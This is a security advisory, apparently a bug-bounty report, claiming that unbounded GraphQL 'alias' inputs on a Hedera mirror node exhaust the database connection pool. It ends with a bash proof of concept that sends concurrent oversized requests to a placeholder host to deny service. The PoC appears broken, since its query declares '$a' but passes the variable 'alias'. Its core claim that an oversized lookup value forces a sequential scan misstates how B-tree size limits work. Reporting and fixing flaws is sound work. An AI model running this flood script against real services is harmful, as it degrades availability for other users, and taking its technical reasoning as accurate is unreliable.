### Title
Unbounded Alias Input Bypasses DB Index, Enabling Connection Pool Exhaustion via GraphQL

### Summary
The GraphQL `AccountInput.alias` field enforces only a character-set pattern (`^[A-Z2-7]+$`) with no length constraint. When submitted via GraphQL variables, the Jackson `maxStringLength` of 11,000 characters is the only ceiling, allowing a decoded byte array of ~6,875 bytes — well above PostgreSQL's B-tree index maximum key size (~2,712 bytes). Queries with such oversized aliases cannot use the `entity__alias` index and force sequential scans, which, when issued concurrently, exhaust the HikariCP connection pool and degrade mirror node availability.

### Finding Description

**Exact code path:**

1. **Schema — no length constraint** (`graphql/src/main/resources/graphql/account.graphqls`, line 90):
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ```
   `@Pattern` validates only the Base32 alphabet; no `@Size` or `maxLength` directive is present.

2. **Jackson limit is the only ceiling** (`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 74–81):
   ```java
   .maxStringLength(11000)
   ```
   When the alias is passed as a **GraphQL variable** (not inline), the query document stays short (well under `maxCharacters(10000)`), so only the Jackson string limit of 11,000 characters applies to the alias value.

3. **No size check in `decodeBase32`** (`graphql/src/main/java/org/hiero/mirror/graphql/util/GraphQlUtils.java`, lines 83–85):
   ```java
   public static byte[] decodeBase32(String base32) {
       return BASE32.decode(base32);
   }
   ```
   An 11,000-character Base32 string decodes to ≈ 6,875 bytes with no guard.

4. **Decoded bytes passed directly to the repository** (`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, line 30):
   ```java
   return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   ```

5. **Native query with no parameter size guard** (`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 13–14):
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ```

6. **Index exists but has a hard size ceiling** (`importer/src/main/resources/db/migration/v1/V1.50.3__account_alias.sql`, lines 12–14):
   ```sql
   create index if not exists entity__alias
       on entity (alias) where alias is not null;
   ```
   PostgreSQL B-tree index entries are capped at ~2,712 bytes (1/3 of an 8 KB page). A 6,875-byte parameter cannot be matched against any index entry; the planner falls back to a sequential scan of the entire `entity` table.

**Why existing checks fail:**
- `@Pattern(regexp: "^[A-Z2-7]+$")` — validates characters only, not length.
- `maxCharacters(10000)` (GraphQL parser) — applies to the query *document*, not to variable values.
- `maxStringLength(11000)` (Jackson) — limits the string to 11,000 chars, but 11,000 Base32 chars still decode to ~6,875 bytes, exceeding the index limit.
- No rate limiting exists on the GraphQL endpoint (unlike the `web3` module which has `ThrottleConfiguration`).
- `db.statementTimeout = 10000` (10 s) bounds each query but does not prevent pool exhaustion when requests arrive faster than they time out.

### Impact Explanation
Each malicious request holds a HikariCP connection for up to 10 seconds while a sequential scan runs on the `entity` table. With a default pool size of 10 connections, as few as 10 concurrent requests saturate the pool. Legitimate queries queue indefinitely, causing the GraphQL service to become unresponsive. Because the GraphQL module is a separate deployment (its own pod/process), this directly degrades mirror node read availability. The Helm chart's own alert rule (`GraphQLHighDBConnections`, threshold 75%) confirms this is a recognized failure mode.

### Likelihood Explanation
No authentication is required to call the GraphQL endpoint. The attack requires only an HTTP client capable of sending concurrent POST requests with a JSON body containing a long variable string — trivially scriptable. The payload is valid Base32, passes all schema-level validation, and produces no error until the DB connection pool is exhausted. The attack is repeatable and stateless.

### Recommendation
1. **Add a `@Size` (or equivalent) constraint on `alias`** in `account.graphqls`. Hedera account aliases are derived from public keys (Ed25519 = 32 bytes → 56 Base32 chars; ECDSA secp256k1 = 33 bytes → 56 Base32 chars). A safe upper bound is 100 characters:
   ```graphql
   alias: String @Size(max: 100) @Pattern(regexp: "^[A-Z2-7]+$")
   ```
2. **Add a byte-length guard in `decodeBase32`** or in `EntityServiceImpl.getByAliasAndType` before calling the repository, rejecting decoded arrays larger than the maximum expected alias size (e.g., 64 bytes).
3. **Add rate limiting to the GraphQL endpoint**, mirroring the `ThrottleConfiguration` already present in the `web3` module.

### Proof of Concept
```bash
# Build a valid Base32 alias of 11000 'A' characters (decodes to ~6875 bytes, bypasses index)
ALIAS=$(python3 -c "print('A' * 11000)")

# Send 20 concurrent requests to exhaust the default connection pool
for i in $(seq 1 20); do
  curl -s -X POST http://<mirror-node-host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"query(\$a:String!){account(input:{alias:\$a}){id}}\",\"variables\":{\"alias\":\"$ALIAS\"}}" &
done
wait

# Subsequent legitimate requests will hang or fail with connection pool timeout
curl -X POST http://<mirror-node-host>:8083/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{"query":"{account(input:{entityId:{shard:0,realm:0,num:2}}){id}}"}'
